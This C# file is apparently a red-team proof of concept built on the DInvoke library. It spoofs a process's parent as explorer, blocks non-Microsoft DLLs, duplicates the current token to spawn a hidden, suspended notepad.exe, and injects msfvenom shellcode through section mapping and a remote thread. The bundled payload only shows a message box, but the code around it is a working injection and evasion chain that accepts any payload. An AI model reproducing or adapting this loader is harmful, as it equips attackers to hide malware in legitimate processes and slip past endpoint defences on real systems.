using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using DInvoke.DynamicInvoke;
using DInvoke.Injection;

namespace DInvokeDupeTokenAndThreatSwitcheroo
{
    class Program
    {

        public static bool Is64Bit
        {
            get { return IntPtr.Size == 8; }
        }

        /*
         * This function will take care of setting the extended startup information (the PID spoofing flag and the blockDLL flag) for our child process
         * If you dont want a hidden child process, comment out the dwflags and wshowwindow flags
         */
        public static STRUCTS.STARTUPINFOEX GetPidSpoofedProcessStartupInfo(string parent = "explorer")
        {
            STRUCTS.STARTUPINFOEX si = new STRUCTS.STARTUPINFOEX();
            STRUCTS.PROCESS_INFORMATION pi = new STRUCTS.PROCESS_INFORMATION();
            si.StartupInfo.cb = (uint)Marshal.SizeOf(si);
            //hidden window
            si.StartupInfo.dwFlags = 0x00000001;
            si.StartupInfo.wShowWindow = 5;
            var lpValue = Marshal.AllocHGlobal(IntPtr.Size);
            var processSecurity = new STRUCTS.SECURITY_ATTRIBUTES();
            var threadSecurity = new STRUCTS.SECURITY_ATTRIBUTES();
            processSecurity.nLength = Marshal.SizeOf(processSecurity);
            threadSecurity.nLength = Marshal.SizeOf(threadSecurity);
            IntPtr lpSize = IntPtr.Zero;
            var funcParams = new object[] {
                IntPtr.Zero,
                2,
                0,
                lpSize
            };
            Generic.DynamicAPIInvoke("kernel32.dll", "InitializeProcThreadAttributeList", typeof(DELEGATES.InitializeProcThreadAttributeList), ref funcParams);
            lpSize = (IntPtr)funcParams[3];
            si.lpAttributeList = Marshal.AllocHGlobal(lpSize);
            funcParams[0] = si.lpAttributeList;
            Generic.DynamicAPIInvoke("kernel32.dll", "InitializeProcThreadAttributeList", typeof(DELEGATES.InitializeProcThreadAttributeList), ref funcParams);
            Marshal.WriteIntPtr(lpValue, new IntPtr((long)STRUCTS.BinarySignaturePolicy.BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON));
            funcParams = new object[]
            {
                si.lpAttributeList,
                (uint)0,
                (IntPtr)STRUCTS.ProcThreadAttribute.MITIGATION_POLICY,
                lpValue,
                (IntPtr)IntPtr.Size,
                IntPtr.Zero,
                IntPtr.Zero
            };
            Generic.DynamicAPIInvoke("kernel32.dll", "UpdateProcThreadAttribute", typeof(DELEGATES.UpdateProcThreadAttribute), ref funcParams);
            IntPtr hParent = Process.GetProcessesByName(parent)[0].Handle;
            if (hParent != IntPtr.Zero)
            {
                Console.WriteLine("handle on {0} obtained successfully!", parent);
            }
            lpValue = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(lpValue, hParent);

            funcParams = new object[]
            {
                si.lpAttributeList,
                (uint)0,
                (IntPtr)STRUCTS.ProcThreadAttribute.PARENT_PROCESS,
                lpValue,
                (IntPtr)IntPtr.Size,
                IntPtr.Zero,
                IntPtr.Zero
            };
            Generic.DynamicAPIInvoke("kernel32.dll", "UpdateProcThreadAttribute", typeof(DELEGATES.UpdateProcThreadAttribute), ref funcParams);
            return si;
        }


        /*
         * This is the magic function that will duplicate the token of the caller, duplicate it, and use that token to spawn a new process.
         * In this PoC the process spawned requires extended startupinfo, but you can modify this to take regular startupinfo instead.
         */
        public static STRUCTS.PROCESS_INFORMATION spawnAs(string processtoSpawn, string procArgs, bool suspended = false)
        {

            IntPtr token = WindowsIdentity.GetCurrent().Token;
            IntPtr dupedToken = IntPtr.Zero;
            Object[] dupetokenparams = { token, (uint)0, null, STRUCTS.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, STRUCTS.TOKEN_TYPE.TokenImpersonation, dupedToken };
            bool success = (bool)Generic.DynamicAPIInvoke("Advapi32.dll", "DuplicateTokenEx", typeof(DELEGATES.DuplicateTokenEx), ref dupetokenparams, true);
            dupedToken = (IntPtr)dupetokenparams[5];
            if (!success)
            {
                throw new Exception("token could not be duplicated");

            }

            STRUCTS.STARTUPINFOEX si = GetPidSpoofedProcessStartupInfo();
            STRUCTS.PROCESS_INFORMATION pi = new STRUCTS.PROCESS_INFORMATION();
            Object[] createprocAsParams = { dupedToken, processtoSpawn, procArgs, null, null, true, STRUCTS.CreationFlags.EXTENDED_STARTUPINFO_PRESENT | STRUCTS.CreationFlags.CREATE_NO_WINDOW, null, null, si, pi };
            if (suspended)
            {
                createprocAsParams[6] = STRUCTS.CreationFlags.EXTENDED_STARTUPINFO_PRESENT | STRUCTS.CreationFlags.CREATE_NO_WINDOW | STRUCTS.CreationFlags.CREATE_SUSPENDED;
            }
            Generic.DynamicAPIInvoke("Advapi32.dll", "CreateProcessAsUserA", typeof(DELEGATES.CreateProcessAsUserEx), ref createprocAsParams);
            pi = (STRUCTS.PROCESS_INFORMATION)createprocAsParams[10];
            if (pi.hProcess != IntPtr.Zero)
            {
                Console.WriteLine("process {0} with arguments {1} spawned successfully! PID:{2}", processtoSpawn, procArgs, pi.dwProcessId);
            }

            return pi;

        }

        static void Main(string[] args)
        {
            if (!Is64Bit)
            {
                throw new Exception("PoC only works for x64 compilations");
            }
            /* msfvenom messagebox */
            byte[] buf = new byte[291] {
            0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
            0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
            0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
            0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
            0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,
            0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
            0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
            0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,
            0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,
            0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
            0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
            0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
            0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
            0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,
            0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0xfe,0x00,0x00,0x00,0x3e,0x4c,0x8d,
            0x85,0x0b,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
            0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x45,0x56,0x49,
            0x4c,0x20,0x50,0x41,0x59,0x4c,0x4f,0x41,0x44,0x00,0x4d,0x65,0x73,0x73,0x61,
            0x67,0x65,0x42,0x6f,0x78,0x00 };


            string surrogate = @"C:\Windows\System32\notepad.exe";
            STRUCTS.PROCESS_INFORMATION pi = spawnAs(surrogate, "lol command line arguments", true);
            Console.WriteLine("injecting in newly spawned {0} PID: {1}", surrogate, pi.dwProcessId);
            Process surrogateproc = Process.GetProcessById(pi.dwProcessId);

            PICPayload payload = new PICPayload(buf);
            AllocationTechnique technique = new SectionMapAlloc();
            ExecutionTechnique executionTechnique = new RemoteThreadCreate();
            Injector.Inject(payload, technique, executionTechnique, surrogateproc);
            object[] terminateThreadParams = { pi.hThread };
            Thread.Sleep(1000);
            Generic.DynamicAPIInvoke("kernel32.dll", "TerminateThread", typeof(DELEGATES.TerminateThread), ref terminateThreadParams);
            Console.WriteLine("==============================================");
        }
    }
}
